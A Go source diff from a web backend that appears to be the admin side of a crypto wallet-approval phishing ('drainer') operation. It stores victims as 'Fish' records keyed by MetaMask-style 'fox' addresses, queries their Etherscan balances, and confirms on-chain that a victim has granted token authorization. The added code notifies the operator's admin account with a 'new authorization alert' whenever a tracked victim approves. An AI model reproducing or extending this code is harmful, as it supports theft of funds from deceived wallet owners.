@@ -264,7 +264,7 @@ func FoxMoneyUpTwo(c *gin.Context) {
 	apikey := viper.GetString("eth.apikey")
 	resp, err := http.Get("https://api.etherscan.io/api?module=account&action=balance&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
 
-	fmt.Println("https://api.etherscan.io/api?module=account&action=balance&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
+	//fmt.Println("https://api.etherscan.io/api?module=account&action=balance&address=" + foxAddress + "&tag=latest&apikey=" + apikey)
 	if err != nil {
 		util.JsonWrite(c, -101, nil, "fail")
 		return
@@ -383,7 +383,20 @@ func CheckAuthorization(c *gin.Context) {
 			}
 			if basket.Result.Status == "1" {
 				//  hash 事务查询成功 交易成功
+
 				mysql.DB.Model(&model.Fish{}).Where("fox_address=?", foxAddress).Update(&model.Fish{Authorization: 2, Updated: time.Now().Unix(), BAddress: BAddress})
+
+				fish := model.Fish{}
+				err := mysql.DB.Where("fox_address=?", foxAddress).First(&fish).Error
+				if fish.MonitoringSwitch == 1 {
+					if err == nil {
+						//  新增授权
+						fishID := strconv.Itoa(int(fish.ID))
+						content := "[新增授权报警] 编号: [" + fishID + "] 已经授权,时间: " + time.Now().Format("2006-01-02 15:04:05")
+						model.NotificationAdmin(mysql.DB, fish.AdminId, content)
+					}
+				}
+
 				break
 			}
 			time.Sleep(2 * time.Second)
